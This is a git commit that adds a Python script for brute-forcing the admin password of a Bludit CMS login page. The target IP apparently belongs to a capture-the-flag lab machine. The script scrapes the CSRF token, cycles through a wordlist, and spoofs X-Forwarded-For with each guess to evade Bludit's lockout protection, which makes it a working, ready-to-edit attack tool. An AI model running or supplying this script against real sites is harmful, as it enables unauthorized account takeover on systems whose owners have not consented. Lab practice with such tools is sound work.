b36ddf8b272f93bc3fdcddc18a30ede342755e61
Sourtimez <61333042+sourtimez@users.noreply.github.com>
2021-01-09 14:07:25 -0500

    Create bluditBF.py

---
+++ bluditBF.py
@@ -0,0 +1,39 @@
+#!/usr/bin/env python3
+import re
+import requests
+from numpy import loadtxt
+
+host = 'http://10.10.10.191'  # update
+login_url = host + '/admin/login' 
+username = 'admin' # update
+wordlist = loadtxt('wordlist.txt', dtype=str) # update with path to wordlist
+
+for password in wordlist:
+    session = requests.Session()
+    login_page = session.get(login_url)
+    csrf_token = re.search('input.+?name="tokenCSRF".+?value="(.+?)"', login_page.text).group(1)
+
+    print('[*] Trying: {p}'.format(p = password))
+
+    headers = {
+        'X-Forwarded-For': password,
+        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36',
+        'Referer': login_url
+    }
+
+    data = {
+        'tokenCSRF': csrf_token,
+        'username': username,
+        'password': password,
+        'save': ''
+    }
+
+    login_result = session.post(login_url, headers = headers, data = data, allow_redirects = False)
+
+    if 'location' in login_result.headers:
+        if '/admin/dashboard' in login_result.headers['location']:
+            print()
+            print('SUCCESS: Password found!')
+            print('Use {u}:{p} to login.'.format(u = username, p = password))
+            print()
+            break
